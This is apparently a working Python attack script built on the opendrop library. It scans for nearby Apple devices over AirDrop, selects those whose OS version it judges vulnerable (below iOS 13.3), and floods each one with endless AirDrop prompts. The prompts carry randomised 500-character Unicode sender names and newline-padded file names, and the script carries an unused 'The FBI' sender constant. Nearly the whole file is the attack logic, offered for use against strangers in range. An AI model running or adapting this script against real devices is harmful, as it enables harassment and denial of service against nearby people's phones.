from dis import disco
import ipaddress
import json
import logging
import plistlib
import random
import threading
import time
import requests

from colorama import Fore, Back, Style

from opendrop.client import AirDropBrowser, AirDropClient
from opendrop.config import AirDropConfig, AirDropReceiverFlags
import random

def get_random_unicode(length):

    try:
        get_char = unichr
    except NameError:
        get_char = chr

    # Update this to include code point ranges to be sampled
    include_ranges = [
        ( 0x0021, 0x0021 ),
        ( 0x0023, 0x0026 ),
        ( 0x0028, 0x007E ),
        ( 0x00A1, 0x00AC ),
        ( 0x00AE, 0x00FF ),
        ( 0x0100, 0x017F ),
        ( 0x0180, 0x024F ),
        ( 0x2C60, 0x2C7F ),
        ( 0x16A0, 0x16F0 ),
        ( 0x0370, 0x0377 ),
        ( 0x037A, 0x037E ),
        ( 0x0384, 0x038A ),
        ( 0x038C, 0x038C ),
    ]

    alphabet = [
        get_char(code_point) for current_range in include_ranges
            for code_point in range(current_range[0], current_range[1] + 1)
    ]
    return ''.join(random.choice(alphabet) for i in range(length))

start_new_lines = '\n' * 20
end_new_lines = '\n' * 20
SENDER_NAME = 'The FBI'
ALLOWED_ALL = True
FILE_NAME = f"""
{start_new_lines}
Goofy
{end_new_lines}
"""

rand = lambda: '{0:0{1}x}'.format(random.randint(0, 0xffffffffffff), 12)
attack_counts = {}
config = AirDropConfig()
logger = logging.getLogger(__name__)

logging.basicConfig(level=logging.INFO, format=f'{Style.DIM}%(asctime)s{Style.RESET_ALL} %(message)s')

def get_os_version(discover):
    try:
        receiver_media_cap = json.loads(discover['ReceiverMediaCapabilities'])
        return receiver_media_cap['Vendor']['com.apple']['OSVersion']
    except:
        pass

def get_is_mac(os_version):
    if os_version:
        if os_version[0] == 10 and os_version[1] >= 7:
            return True
    return False

def get_is_vuln(os_version):
    if os_version:
        if (os_version[0] == 13 and os_version[1] >= 3) or os_version[0] >= 14:
            return False
    return True

def send_ask(node_info):
    
    # set the SENDER_NAME to 15 random unicode charactewrs
    
    SENDER_NAME = get_random_unicode(500)

    ask_body = {
        'SenderComputerName': SENDER_NAME,
        'SenderModelName': rand(),
        'SenderID': rand(),
        'BundleID': 'com.apple.finder',
        'Files': [{
            'FileName': FILE_NAME,
            'FileType': 'public.plain-text'
        }]
    }
    ask_binary = plistlib.dumps(ask_body, fmt=plistlib.FMT_BINARY)
    id = node_info['id']
    attack_counts[id] = attack_counts.get(id, 1) + 1
    try:
        client = AirDropClient(config, (node_info['address'], node_info['port']))
        success, _ = client.send_POST('/Ask', ask_binary)

        print("Sent: " + success)

        return success
    except:
        return True
        pass

def send(node_info):
    name = node_info['name']
    receiver_name = Fore.GREEN + name + Fore.RESET
    # if name != "B":
    #     return
    id = node_info['id']
    attack_count = attack_counts.get(id, 1)
    logging.info(f'❔ Prompting   {receiver_name} (#{attack_count})')
    success = send_ask(node_info)
    if success == True:
        logging.info(f'✅ Sent and cleared {receiver_name} (#{attack_count})')
    elif success == False:
        logging.info(f'❌ Declined by {receiver_name} (#{attack_count})')
    else:
        logging.info(f'🛑 Errored     {receiver_name} (#{attack_count})')
        success = False
    
    time.sleep(3.4)
    return True

def brute(node_info):
    error_count = 0
    while True:
        if send(node_info) == False:
            error_count += 1
            if error_count > 2:
                time.sleep(10)

def start_brute(node_info):
    # two threads just for good measure
    # this makes sure there is always another popup to decline if there is any network delay
    for i in range(1):
        thread = threading.Thread(target=brute, args=(node_info,), daemon=True)
        thread.start()

def found_receiver(info):
    thread = threading.Thread(target=on_receiver_found, args=(info,))
    thread.start()

def send_discover(client):
    discover_body = {}
    discover_plist_binary = plistlib.dumps(discover_body, fmt=plistlib.FMT_BINARY)
    success, response_bytes = client.send_POST('/Discover', discover_plist_binary)
    response = plistlib.loads(response_bytes)
    return response

def on_receiver_found(info):
    try:
        address = ipaddress.ip_address(info.parsed_addresses()[0]).compressed
    except ValueError:
        return
    id = info.name.split('.')[0]
    hostname = info.server
    port = int(info.port)
    client = AirDropClient(config, (address, int(port)))
    flags = int(info.properties[b'flags'])

    receiver_name = None
    if flags & AirDropReceiverFlags.SUPPORTS_DISCOVER_MAYBE:
        try:
            discover = send_discover(client)
            receiver_name = discover.get('ReceiverComputerName')
            os_version = get_os_version(discover)
        except:
            pass
    discoverable = receiver_name is not None

    node_info = {
        'name': receiver_name,
        'address': address,
        'port': port,
        'id': id,
        'flags': flags,
        'discoverable': discoverable,
    }
    if discoverable:
        os_v = '.'.join(map(str, os_version)) if os_version else ''
        is_mac = get_is_mac(os_version)
        is_vuln = get_is_vuln(os_version)
        additional = f'{Style.DIM}{id} {hostname} [{address}]:{port}{Style.RESET_ALL}'
        if not ALLOWED_ALL and receiver_name != "B":
            logger.info('❌ Ignoring    {:32} macOS {:>7} {}'.format(Fore.YELLOW + receiver_name + Fore.RESET, os_v, additional))
        elif not is_vuln:
            logger.info('❌ Ignoring    {:32} iOS   {:>7} {}'.format(Fore.RED + receiver_name + Fore.RESET, os_v, additional))
        else:
            logger.info('🔍 Found       {:32} iOS   {:>7} {}'.format(Fore.GREEN + receiver_name + Fore.RESET, os_v, additional))
            start_brute(node_info)


logger.info('⏳ Looking for devices... Open Finder -> AirDrop')
browser = AirDropBrowser(config)
browser.start(callback_add=found_receiver)
try:
    input()
except KeyboardInterrupt:
    pass
finally:
    if browser is not None:
        browser.stop()
